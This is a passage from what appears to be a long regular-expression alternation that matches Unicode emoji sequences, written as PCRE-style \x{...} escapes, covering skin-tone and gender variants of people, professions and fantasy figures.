\x{200d}\x{1f9af}|\x{1f468}\x{1f3fe}\x{200d}\x{1f373}|\x{1f468}\x{1f3fd}\x{200d}\x{1f373}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f4bb}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f4bb}|\x{1f469}\x{1f3fb}\x{200d}\x{2708}|\x{1f468}\x{1f3fe}\x{200d}\x{1f52c}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9af}|\x{1f468}\x{1f3ff}\x{200d}\x{1f52c}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f527}|\x{1f468}\x{1f3fb}\x{200d}\x{1f4bb}|\x{1f468}\x{1f3fc}\x{200d}\x{2708}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f527}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f527}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9af}|\x{1f468}\x{1f3fd}\x{200d}\x{2708}|\x{1f468}\x{1f3fe}\x{200d}\x{2708}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f527}|\x{1f469}\x{1f3fb}\x{200d}\x{1f52c}|\x{1f468}\x{1f3ff}\x{200d}\x{2708}|\x{1f469}\x{200d}\x{2708}\x{fe0f}|\x{1f469}\x{1f3fc}\x{200d}\x{1f52c}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f4bb}|\x{1f9ce}\x{1f3fc}\x{200d}\x{2640}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f527}|\x{1f469}\x{1f3fd}\x{200d}\x{1f52c}|\x{1f469}\x{1f3fb}\x{200d}\x{1f527}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9af}|\x{1f469}\x{1f3fc}\x{200d}\x{1f527}|\x{1f468}\x{1f3ff}\x{200d}\x{1f3a8}|\x{1f468}\x{1f3fd}\x{200d}\x{1f3a8}|\x{1f469}\x{1f3fb}\x{200d}\x{1f3a4}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9af}|\x{1f9ce}\x{1f3ff}\x{200d}\x{2640}|\x{1f468}\x{1f3fe}\x{200d}\x{1f3a8}|\x{1f468}\x{1f3ff}\x{200d}\x{1f3a4}|\x{1f468}\x{1f3ff}\x{200d}\x{1f3ed}|\x{1f468}\x{1f3fe}\x{200d}\x{1f3a4}|\x{1f468}\x{1f3fb}\x{200d}\x{1f4bc}|\x{1f468}\x{1f3fc}\x{200d}\x{1f3a8}|\x{1f468}\x{1f3fe}\x{200d}\x{1f3ed}|\x{1f468}\x{1f3fc}\x{200d}\x{1f4bc}|\x{1f468}\x{1f3fd}\x{200d}\x{1f3a4}|\x{1f468}\x{1f3fd}\x{200d}\x{1f3ed}|\x{1f468}\x{1f3fd}\x{200d}\x{1f4bc}|\x{1f469}\x{1f3fb}\x{200d}\x{1f3a8}|\x{1f468}\x{1f3fc}\x{200d}\x{1f3ed}|\x{1f468}\x{1f3fc}\x{200d}\x{1f3a4}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f4bc}|\x{1f469}\x{1f3fb}\x{200d}\x{1f3ed}|\x{1f468}\x{1f3fe}\x{200d}\x{1f4bc}|\x{1f469}\x{1f3fe}\x{200d}\x{1f3a4}|\x{1f469}\x{1f3ff}\x{200d}\x{1f3a4}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f3a8}|\x{1f469}\x{1f3ff}\x{200d}\x{1f3ed}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f4bc}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f3a8}|\x{1f469}\x{1f3fe}\x{200d}\x{1f3ed}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f4bc}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f3a8}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f3a8}|\x{1f469}\x{1f3fc}\x{200d}\x{1f3a4}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f3a8}|\x{1f469}\x{1f3fd}\x{200d}\x{1f3ed}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f4bc}|\x{1f9ce}\x{1f3fe}\x{200d}\x{2640}|\x{1f468}\x{1f3fb}\x{200d}\x{1f3a8}|\x{1f469}\x{1f3fd}\x{200d}\x{1f3a4}|\x{1f469}\x{1f3fc}\x{200d}\x{1f3ed}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f4bc}|\x{1f469}\x{1f3fc}\x{200d}\x{1f3a8}|\x{1f468}\x{1f3fb}\x{200d}\x{1f3a4}|\x{1f468}\x{1f3ff}\x{200d}\x{1f4bb}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f52c}|\x{1f469}\x{1f3fe}\x{200d}\x{1f4bc}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9af}|\x{1f469}\x{1f3ff}\x{200d}\x{1f4bc}|\x{1f9d1}\x{1f3fc}\x{200d}\x{2708}|\x{1f469}\x{1f3fe}\x{200d}\x{1f4bb}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9af}|\x{1f469}\x{1f3ff}\x{200d}\x{1f527}|\x{1f469}\x{1f3fd}\x{200d}\x{1f4bb}|\x{1f9d1}\x{1f3fd}\x{200d}\x{2708}|\x{1f9d1}\x{1f3fb}\x{200d}\x{2708}|\x{1f469}\x{1f3fe}\x{200d}\x{1f527}|\x{1f469}\x{1f3fc}\x{200d}\x{1f4bb}|\x{1f469}\x{1f3fb}\x{200d}\x{1f4bb}|\x{1f9d1}\x{1f3fe}\x{200d}\x{2708}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f52c}|\x{1f469}\x{1f3fd}\x{200d}\x{1f527}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9af}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f52c}|\x{1f469}\x{1f3ff}\x{200d}\x{1f4bb}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f3ed}|\x{1f468}\x{1f3fb}\x{200d}\x{1f3ed}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f3a4}|\x{1f469}\x{1f3fd}\x{200d}\x{1f3a8}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f3a4}|\x{1f468}\x{1f3ff}\x{200d}\x{1f4bc}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9af}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f3ed}|\x{1f469}\x{1f3fe}\x{200d}\x{1f3a8}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f3a4}|\x{1f469}\x{1f3fb}\x{200d}\x{1f4bc}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f3ed}|\x{1f469}\x{1f3fd}\x{200d}\x{1f4bc}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f3a4}|\x{1f469}\x{1f3ff}\x{200d}\x{1f3a8}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f3a4}|\x{1f469}\x{1f3fc}\x{200d}\x{1f4bc}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f3ed}|\x{1f9d1}\x{200d}\x{2708}\x{fe0f}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9af}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f3ed}|\x{1f9ce}\x{1f3fd}\x{200d}\x{2640}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9af}|\x{1f477}\x{1f3ff}\x{200d}\x{2640}|\x{1f469}\x{1f3ff}\x{200d}\x{2708}|\x{1f9b8}\x{1f3fd}\x{200d}\x{2640}|\x{1f9de}\x{200d}\x{2640}\x{fe0f}|\x{1f9b8}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3fb}\x{200d}\x{2642}|\x{1f9b8}\x{1f3fc}\x{200d}\x{2642}|\x{1f9b8}\x{1f3fd}\x{200d}\x{2642}|\x{1f9b8}\x{1f3fe}\x{200d}\x{2642}|\x{1f9b8}\x{1f3ff}\x{200d}\x{2642}|\x{1f9b8}\x{200d}\x{2640}\x{fe0f}|\x{1f9de}\x{200d}\x{2642}\x{fe0f}|\x{1f9b8}\x{1f3fb}\x{200d}\x{2640}|\x{1f9b8}\x{1f3fc}\x{200d}\x{2640}|\x{1f9b8}\x{1f3fe}\x{200d}\x{2640}|\x{1f9df}\x{200d}\x{2640}\x{fe0f}|\x{1f9b8}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dd}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dd}\x{1f3fe}\x{200d}\x{2640}|\x{1f9dd}\x{1f3fd}\x{200d}\x{2640}|\x{1f9b9}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fc}\x{200d}\x{2640}|\x{1f9b9}\x{1f3fb}\x{200d}\x{2642}|\x{1f9b9}\x{1f3fc}\x{200d}\x{2642}|\x{1f9b9}\x{1f3fd}\x{200d}\x{2642}|\x{1f9b9}\x{1f3fe}\x{200d}\x{2642}|\x{1f9b9}\x{1f3ff}\x{200d}\x{2642}|\x{1f9b9}\x{200d}\x{2640}\x{fe0f}|\x{1f9df}\x{200d}\x{2642}\x{fe0f}|\x{1f486}\x{200d}\x{2642}\x{fe0f}|\x{1f9b9}\x{1f3fc}\x{200d}\x{2640}|\x{1f487}\x{1f3fd}\x{200d}\x{2642}|\x{1f473}\x{1f3ff}\x{200d}\x{2640}|\x{1f6b6}\x{1f3fc}\x{200d}\x{2642}|\x{1f6b6}\x{1f3fb}\x{200d}\x{2642}|\x{1f6b6}\x{200d}\x{2642}\x{fe0f}|\x{1f487}\x{1f3ff}\x{200d}\x{2640}|\x{1f487}\x{1f3fe}\x{200d}\x{2640}|\x{1f487}\x{1f3fd}\x{200d}\x{2640}|\x{1f487}\x{1f3fc}\x{200d}\x{2640}|\x{1f487}\x{1f3fb}\x{200d}\x{2640}|\x{1f487}\x{200d}\x{2640}\x{fe0f}|\x{1f487}\x{1f3ff}\x{200d}\x{2642}|\x{1f487}\x{1f3fe}\x{200d}\x{2642}|\x{1f487}\x{1f3fc}\x{200d}\x{2642}|\x{1f486}\x{1f3fb}\x{200d}\x{2642}|\x{1f487}\x{1f3fb}\x{200d}\x{2642}|\x{1f487}\x{200d}\x{2642}\x{fe0f}|\x{1f486}\x{1f3ff}\x{200d}\x{2640}|\x{1f486}\x{1f3fe}\x{200d}\x{2640}|\x{1f486}\x{1f3fd}\x{200d}\x{2640}|\x{1f486}\x{1f3fc}\x{200d}\x{2640}|\x{1f486}\x{1f3fb}\x{200d}\x{2640}|\x{1f486}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3ff}\x{200d}\x{2642}|\x{1f486}\x{1f3fe}\x{200d}\x{2642}|\x{1f486}\x{1f3fd}\x{200d}\x{2642}|\x{1f486}\x{1f3fc}\x{200d}\x{2642}|\x{1f9b9}\x{1f3fb}\x{200d}\x{2640}|\x{1f9b9}\x{1f3fd}\x{200d}\x{2640}|\x{1f473}\x{1f3fd}\x{200d}\x{2640}|\x{1f9db}\x{1f3ff}\x{200d}\x{2642}|\x{1f9da}\x{1f3fd}\x{200d}\x{2640}|\x{1f9da}\x{1f3fe}\x{200d}\x{2640}|\x{1f9da}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dc}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dc}\x{1f3fe}\x{200d}\x{2640}|\x{1f9dc}\x{1f3fd}\x{200d}\x{2640}|\x{1f9db}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3fc}\x{200d}\x{2640}|\x{1f9db}\x{1f3fb}\x{200d}\x{2642}|\x{1f9db}\x{1f3fc}\x{200d}\x{2642}|\x{1f9db}\x{1f3fd}\x{200d}\x{2642}|\x{1f9db}\x{1f3fe}\x{200d}\x{2642}|\x{1f9db}\x{200d}\x{2640}\x{fe0f}|\x{1f9da}\x{1f3fb}\x{200d}\x{2640}|\x{1f9db}\x{1f3fb}\x{200d}\x{2640}|\x{1f9db}\x{1f3fc}\x{200d}\x{2640}|\x{1f9db}\x{1f3fd}\x{200d}\x{2640}|\x{1f9db}\x{1f3fe}\x{200d}\x{2640}|\x{1f9db}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dc}\x{1f3fb}\x{200d}\x{2640}|\x{1f9dc}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3ff}\x{200d}\x{2642}|\x{1f9dc}\x{200d}\x{2642}\x{fe0f}|\x{1f9dc}\x{1f3fe}\x{200d}\x{2642}|\x{1f9dc}\x{1f3fb}\x{200d}\x{2642}|\x{1f9dc}\x{1f3fc}\x{200d}\x{2642}|\x{1f9da}\x{1f3fc}\x{200d}\x{2640}|\x{1f9dd}\x{200d}\x{2642}\x{fe0f}|\x{1f9b9}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d9}\x{1f3fb}\x{200d}\x{2640}|\x{1f9b9}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dd}\x{1f3fb}\x{200d}\x{2640}|\x{1f9dd}\x{200d}\x{2640}\x{fe0f}|\x{1f9dd}\x{1f3ff}\x{200d}\x{2642}|\x{1f9d9}\x{200d}\x{2642}\x{fe0f}|\x{1f9dd}\x{1f3fe}\x{200d}\x{2642}|\x{1f9d9}\x{1f3fb}\x{200d}\x{2642}|\x{1f9d9}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d9}\x{1f3fd}\x{200d}\x{2642}|\x{1f9d9}\x{1f3fe}\x{200d}\x{2642}|\x{1f9d9}\x{1f3ff}\x{200d}\x{2642}|\x{1f9d9}\x{200d}\x{2640}\x{fe0f}|\x{1f9d9}\x{1f3fc}\x{200d}\x{2640}|\x{1f9da}\x{200d}\x{2640}\x{fe0f}|\x{1f9d9}\x{1f3fd}\x{200d}\x{2640}|\x{1f9d9}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d9}\x{1f3ff}\x{200d}\x{2640}|\x{1f9dd}\x{1f3fd}\x{200d}\x{2642}|\x{1f9dd}\x{1f3fc}\x{200d}\x{2642}|\x{1f9dd}\x{1f3fb}\x{200d}\x{2642}|\x{1f9da}\x{200d}\x{2642}\x{fe0f}|\x{1f9da}\x{1f3fb}\x{200d}\x{2642}|\x{1f9da}\x{1f3fc}\x{200d}\x{2642}|\x{1f9da}\x{1f3fd}\x{200d}\x{2642}|\x{1f9da}\x{1f3fe}\x{200d}\x{2642}|\x{1f9da}\x{1f3ff}\x{200d}\x{2642}|\x{1f473}\x{1f3fe}\x{200d}\x{2640}|\x{1f473}\x{1f3fc}\x{200d}\x{2640}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f680}|\x{1f46e}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fe}\x{200d}\x{1f692}|\x{1f469}\x{1f3ff}\x{200d}\x{1f692}|\x{1f9ce}\x{1f3fe}\x{200d}\x{2642}|\x{1f9ce}\x{1f3fd}\x{200d}\x{2642}|\x{1f9ce}\x{1f3fc}\x{200d}\x{2642}|\x{1f46e}\x{200d}\x{2642}\x{fe0f}|\x{1f46e}\x{1f3fb}\x{200d}\x{2642}|\x{1f46e}\x{1f3fc}\x{200d}\x{2642}|\x{1f46e}\x{1f3fd}\x{200d}\x{2642}|\x{1f46e}\x{1f3fe}\x{200d}\x{2642}|\x{1f46e}\x{1f3ff}\x{200d}\x{2642}|\x{1f9ce}\x{1f3fb}\x{200d}\x{2642}|\x{1f469}\x{1f3fc}\x{200d}\x{1f692}|\x{1f46e}\x{1f3fb}\x{200d}\x{2640}|\x{1f46e}\x{1f3fc}\x{200d}\x{2640}|\x{1f46e}\x{1f3fd}\x{200d}\x{2640}|\x{1f46e}\x{1f3fe}\x{200d}\x{2640}|\x{1f46e}\x{1f3ff}\x{200d}\x{2640}|\x{1f9ce}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3ff}\x{200d}\x{2640}|\x{1f9cd}\x{1f3fe}\x{200d}\x{2640}|\x{1f575}\x{200d}\x{2642}\x{fe0f}|\x{1f575}\x{fe0f}\x{200d}\x{2642}|\x{1f9cd}\x{1f3fd}\x{200d}\x{2640}|\x{1f575}\x{1f3fb}\x{200d}\x{2642}|\x{1f469}\x{1f3fd}\x{200d}\x{1f692}|\x{1f469}\x{1f3fb}\x{200d}\x{1f692}|\x{1f575}\x{1f3fd}\x{200d}\x{2642}|\x{1f469}\x{1f3fd}\x{200d}\x{1f680}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f680}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f680}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f680}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f680}|\x{1f9ce}\x{1f3fb}\x{200d}\x{2640}|\x{1f468}\x{1f3fb}\x{200d}\x{1f680}|\x{1f468}\x{1f3fc}\x{200d}\x{1f680}|\x{1f468}\x{1f3fd}\x{200d}\x{1f680}|\x{1f468}\x{1f3fe}\x{200d}\x{1f680}|\x{1f468}\x{1f3ff}\x{200d}\x{1f680}|\x{1f469}\x{1f3fb}\x{200d}\x{1f680}|\x{1f469}\x{1f3fc}\x{200d}\x{1f680}|\x{1f469}\x{1f3fe}\x{200d}\x{1f680}|\x{1f9ce}\x{1f3ff}\x{200d}\x{2642}|\x{1f469}\x{1f3ff}\x{200d}\x{1f680}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f692}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f692}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f692}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f692}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f692}|\x{1f9ce}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fb}\x{200d}\x{1f692}|\x{1f468}\x{1f3fc}\x{200d}\x{1f692}|\x{1f468}\x{1f3fd}\x{200d}\x{1f692}|\x{1f468}\x{1f3fe}\x{200d}\x{1f692}|\x{1f468}\x{1f3ff}\x{200d}\x{1f692}|\x{1f575}\x{1f3fc}\x{200d}\x{2642}|\x{1f575}\x{1f3fe}\x{200d}\x{2642}|\x{1f473}\x{1f3fb}\x{200d}\x{2640}|\x{1f6b6}\x{1f3fd}\x{200d}\x{2640}|\x{1f477}\x{1f3fd}\x{200d}\x{2642}|\x{1f477}\x{1f3fe}\x{200d}\x{2642}|\x{1f477}\x{1f3ff}\x{200d}\x{2642}|\x{1f477}\x{200d}\x{2640}\x{fe0f}|\x{1f477}\x{1f3fb}\x{200d}\x{2640}|\x{1f477}\x{1f3fc}\x{200d}\x{2640}|\x{1f477}\x{1f3fd}\x{200d}\x{2640}|\x{1f477}\x{1f3fe}\x{200d}\x{2640}|\x{1f468}\x{1f3fb}\x{200d}\x{1f373}|\x{1f9cd}\x{200d}\x{2642}\x{fe0f}|\x{1f6b6}\x{1f3ff}\x{200d}\x{2640}|\x{1f6b6}\x{1f3fe}\x{200d}\x{2640}|\x{1f6b6}\x{1f3fc}\x{200d}\x{2640}|\x{1f477}\x{1f3fb}\x{200d}\x{2642}|\x{1f6b6}\x{1f3fb}\x{200d}\x{2640}|\x{1f6b6}\x{200d}\x{2640}\x{fe0f}|\x{1f6b6}\x{1f3ff}\x{200d}\x{2642}|\x{1f6b6}\x{1f3fe}\x{200d}\x{2642}|\x{1f473}\x{200d}\x{2642}\x{fe0f}|\x{1f6b6}\x{1f3fd}\x{200d}\x{2642}|\x{1f473}\x{1f3fb}\x{200d}\x{2642}|\x{1f473}\x{1f3fc}\x{200d}\x{2642}|\x{1f473}\x{1f3fd}\x{200d}\x{2642}|\x{1f473}\x{1f3fe}\x{200d}\x{2642}|\x{1f473}\x{1f3ff}\x{200d}\x{2642}|\x{1f473}\x{200d}\x{2640}\x{fe0f}|\x{1f477}\x{1f3fc}\x{200d}\x{2642}|\x{1f9cd}\x{1f3fb}\x{200d}\x{2642}|\x{1f575}\x{1f3ff}\x{200d}\x{2642}|\x{1f482}\x{1f3fb}\x{200d}\x{2642}|\x{1f575}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{fe0f}\x{200d}\x{2640}|\x{1f575}\x{1f3fb}\x{200d}\x{2640}|\x{1f575}\x{1f3fc}\x{200d}\x{2640}|\x{1f575}\x{1f3fd}\x{200d}\x{2640}|\x{1f575}\x{1f3fe}\x{200d}\x{2640}|\x{1f575}\x{1f3ff}\x{200d}\x{2640}|\x{1f9cd}\x{1f3fc}\x{200d}\x{2640}|\x{1f9cd}\x{1f3fb}\x{200d}\x{2640}|\x{1f9cd}\x{200d}\x{2640}\x{fe0f}|\x{1f482}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3ff}\x{200d}\x{2642}|\x{1f482}\x{1f3fc}\x{200d}\x{2642}|\x{1f477}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3fd}\x{200d}\x{2642}|\x{1f482}\x{1f3fe}\x{200d}\x{2642}|\x{1f482}\x{1f3ff}\x{200d}\x{2642}|\x{1f482}\x{200d}\x{2640}\x{fe0f}|\x{1f482}\x{1f3fb}\x{200d}\x{2640}|\x{1f482}\x{1f3fc}\x{200d}\x{2640}|\x{1f482}\x{1f3fd}\x{200d}\x{2640}|\x{1f482}\x{1f3fe}\x{200d}\x{2640}|\x{1f482}\x{1f3ff}\x{200d}\x{2640}|\x{1f9cd}\x{1f3fe}\x{200d}\x{2642}|\x{1f9cd}\x{1f3fd}\x{200d}\x{2642}|\x{1f9cd}\x{1f3fc}\x{200d}\x{2642}|\x{1f468}\x{1f3fc}\x{200d}\x{1f373}|\x{1f647}\x{200d}\x{2640}\x{fe0f}|\x{1f9dc}\x{1f3fd}\x{200d}\x{2642}|\x{1f3cc}\x{fe0f}\x{200d}\x{2640}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9b1}|\x{1f3cc}\x{1f3fc}\x{200d}\x{2640}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9b3}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9b3}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9b3}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9b3}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9b3}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9b2}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9b2}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9b2}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9b2}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9b2}|\x{1f3cc}\x{1f3fb}\x{200d}\x{2640}|\x{1f3cc}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9b1}|\x{1f3cc}\x{1f3ff}\x{200d}\x{2642}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9b0}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9b0}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9b0}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9b0}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9b0}|\x{1f3cc}\x{1f3fe}\x{200d}\x{2642}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9b0}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9b0}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9b0}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f9b0}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9b0}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9b1}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9b1}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9b1}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9b1}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9b1}|\x{1f3c4}\x{1f3fb}\x{200d}\x{2640}|\x{1f6a3}\x{1f3fc}\x{200d}\x{2640}|\x{1f6a3}\x{1f3fb}\x{200d}\x{2640}|\x{1f6a3}\x{200d}\x{2640}\x{fe0f}|\x{1f6a3}\x{1f3ff}\x{200d}\x{2642}|\x{1f6a3}\x{1f3fe}\x{200d}\x{2642}|\x{1f6a3}\x{1f3fd}\x{200d}\x{2642}|\x{1f6a3}\x{1f3fc}\x{200d}\x{2642}|\x{1f6a3}\x{1f3fb}\x{200d}\x{2642}|\x{1f6a3}\x{200d}\x{2642}\x{fe0f}|\x{1f3c4}\x{1f3ff}\x{200d}\x{2640}|\x{1f3c4}\x{1f3fe}\x{200d}\x{2640}|\x{1f3c4}\x{1f3fd}\x{200d}\x{2640}|\x{1f3c4}\x{1f3fc}\x{200d}\x{2640}|\x{1f3c4}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9b1}|\x{1f3c4}\x{1f3ff}\x{200d}\x{2642}|\x{1f3c4}\x{1f3fe}\x{200d}\x{2642}|\x{1f3c4}\x{1f3fd}\x{200d}\x{2642}|\x{1f3c4}\x{1f3fc}\x{200d}\x{2642}|\x{1f3c4}\x{1f3fb}\x{200d}\x{2642}|\x{1f3c4}\x{200d}\x{2642}\x{fe0f}|\x{1f3cc}\x{1f3ff}\x{200d}\x{2640}|\x{1f3cc}\x{1f3fe}\x{200d}\x{2640}|\x{1f3cc}\x{1f3fd}\x{200d}\x{2640}|\x{1f468}\x{1f3fb}\x{200d}\x{1f9b0}|\x{1f468}\x{1f3fc}\x{200d}\x{1f9b0}|\x{1f468}\x{1f3fd}\x{200d}\x{1f9b0}|\x{1f468}\x{1f3fe}\x{200d}\x{1f9b0}|\x{1f468}\x{1f3ff}\x{200d}\x{1f9b0}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9b1}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9b1}|\x{1f6a3}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d7}\x{1f3ff}\x{200d}\x{2642}|\x{1f471}\x{1f3fb}\x{200d}\x{2642}|\x{1f471}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f373}|\x{1f471}\x{1f3fe}\x{200d}\x{2642}|\x{1f471}\x{1f3ff}\x{200d}\x{2642}|\x{1f3cc}\x{fe0f}\x{200d}\x{2642}|\x{1f3cc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d7}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d7}\x{1f3fe}\x{200d}\x{2640}|\x{1f9d7}\x{1f3fd}\x{200d}\x{2640}|\x{1f9d7}\x{1f3fc}\x{200d}\x{2640}|\x{1f9d7}\x{1f3fb}\x{200d}\x{2640}|\x{1f9d7}\x{200d}\x{2640}\x{fe0f}|\x{1f9d7}\x{1f3fe}\x{200d}\x{2642}|\x{1f471}\x{1f3ff}\x{200d}\x{2640}|\x{1f9d7}\x{1f3fd}\x{200d}\x{2642}|\x{1f9d7}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d7}\x{1f3fb}\x{200d}\x{2642}|\x{1f64d}\x{200d}\x{2642}\x{fe0f}|\x{1f64d}\x{1f3fb}\x{200d}\x{2642}|\x{1f64d}\x{1f3fc}\x{200d}\x{2642}|\x{1f64d}\x{1f3fd}\x{200d}\x{2642}|\x{1f64d}\x{1f3fe}\x{200d}\x{2642}|\x{1f64d}\x{1f3ff}\x{200d}\x{2642}|\x{1f64d}\x{200d}\x{2640}\x{fe0f}|\x{1f64d}\x{1f3fb}\x{200d}\x{2640}|\x{1f64d}\x{1f3fc}\x{200d}\x{2640}|\x{1f64d}\x{1f3fd}\x{200d}\x{2640}|\x{1f64d}\x{1f3fe}\x{200d}\x{2640}|\x{1f471}\x{200d}\x{2642}\x{fe0f}|\x{1f471}\x{1f3fe}\x{200d}\x{2640}|\x{1f3cc}\x{1f3fd}\x{200d}\x{2642}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f9b3}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9b1}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9b1}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9b1}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f9b1}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9b1}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9b3}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9b3}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9b3}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9b3}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9b3}|\x{1f3cc}\x{1f3fc}\x{200d}\x{2642}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9b3}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9b3}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9b3}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9b3}|\x{1f471}\x{1f3fd}\x{200d}\x{2640}|\x{1f469}\x{1f3fb}\x{200d}\x{1f9b2}|\x{1f469}\x{1f3fc}\x{200d}\x{1f9b2}|\x{1f469}\x{1f3fd}\x{200d}\x{1f9b2}|\x{1f469}\x{1f3fe}\x{200d}\x{1f9b2}|\x{1f469}\x{1f3ff}\x{200d}\x{1f9b2}|\x{1f3cc}\x{1f3fb}\x{200d}\x{2642}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f9b2}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f9b2}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f9b2}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f9b2}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f9b2}|\x{1f471}\x{200d}\x{2640}\x{fe0f}|\x{1f471}\x{1f3fb}\x{200d}\x{2640}|\x{1f471}\x{1f3fc}\x{200d}\x{2640}|\x{1f6a3}\x{1f3fd}\x{200d}\x